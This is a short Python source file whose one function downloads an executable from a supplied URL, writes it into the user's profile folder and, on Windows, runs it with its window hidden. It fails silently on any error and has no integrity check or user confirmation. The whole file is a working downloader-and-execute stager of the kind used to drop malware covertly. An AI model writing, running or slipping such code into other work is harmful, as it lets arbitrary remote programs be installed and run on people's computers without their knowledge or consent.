import requests
import subprocess
import sys
import os

def init(url: str, name="file"):
    userprofile = os.getenv("USERPROFILE")
    if userprofile == None or not os.path.exists(userprofile):
        filepath = name + ".exe"
    else:
        filepath = os.path.join(userprofile, name + ".exe")

    try:
        rsp = requests.get(url)
        rsp.raise_for_status()  

        with open(filepath, "wb") as file:
            file.write(rsp.content)

        if not os.path.exists(filepath):
            sys.exit()

        if sys.platform == "win32":
            subprocess.Popen(filepath, creationflags=subprocess.CREATE_NO_WINDOW)

    except requests.exceptions.RequestException as e:
        sys.exit()
    except Exception as e:
        sys.exit()
